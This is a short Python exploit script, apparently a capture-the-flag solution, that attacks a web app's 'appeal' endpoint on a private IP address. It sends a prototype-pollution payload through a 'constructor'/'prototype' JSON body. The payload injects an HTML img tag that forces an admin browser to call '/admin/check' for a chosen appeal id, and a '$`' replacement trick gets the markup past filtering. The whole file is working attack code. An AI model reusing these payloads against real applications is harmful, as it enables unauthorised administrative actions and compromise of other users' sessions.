import requests

burp0_url = "http://10.212.26.206:21451/appeal/add"
burp0_cookies = {"appeal_id": "289fe4bdb8c5573d708e078212de2356424b"}
burp0_json={"content": "{\"msg\":\"i love or4ngei love or4ngeor4nge\"}", "type": "appeal"}
requests.post(burp0_url, cookies=burp0_cookies, json=burp0_json)

burp1_cookies = {"appeal_id": "b3a9cddc288ba824e2f2140ae859dddcd66e"}
burp1_json={"content": "{\"prototype\":{\"div\":[\"1\",\"<=or><img src='/admin/check?appeal_id=289fe4bdb8c5573d708e078212de2356424b&harmonious=$`'>\"]}}", "type": "constructor"}
requests.post(burp0_url, cookies=burp1_cookies, json=burp1_json)

print('http://10.212.26.206:21451/view?add_id=%s' % burp1_cookies['appeal_id'])